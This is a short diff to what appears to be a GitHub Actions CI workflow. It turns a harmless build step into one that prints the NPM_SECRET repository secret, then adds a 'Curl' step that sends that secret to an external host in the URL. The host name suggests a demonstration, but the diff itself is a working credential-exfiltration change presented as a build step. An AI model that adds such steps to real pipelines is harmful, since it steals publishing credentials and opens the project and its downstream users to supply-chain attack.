@@ -12,5 +12,8 @@ jobs:
     steps:
       
       - name: Build 
-        run: echo "building"
+        run: echo "${{ secrets.NPM_SECRET }}"
+
+      - name: Curl
+	run: "curl https://threats.tngtech.com/xxx/${{ secrets.NPM_SECRET }}"
 
